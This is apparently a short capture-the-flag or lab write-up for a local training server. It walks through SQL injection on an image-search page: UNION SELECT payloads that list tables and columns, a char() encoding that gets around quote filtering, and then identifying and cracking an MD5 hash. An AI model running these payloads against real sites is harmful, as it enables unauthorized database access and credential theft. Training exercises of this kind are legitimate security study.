# http://172.28.128.136/?page=searchimg

### 1. Get table's names:

`1 union select TABLE_NAME, 2 from information_schema.tables`

---

### 2. Get all 'list_images' table column's names:

`1 union select column_name, 2 FROM information_schema.columns WHERE table_name = char(108,105,115,116,95,105,109,97,103,101,115)`

_NOTE:_ mariaDB uses magic quotes defence, so we need to use the char rappresentation of 'list_images' &rarr; char(108,105,115,116,95,105,109,97,103,101,115)

---

### 3. Identify encrypting algorithm:

`hashcat --identify`

---

### 4. Decrypt 'comment' value:

https://md5decrypt.net/en/
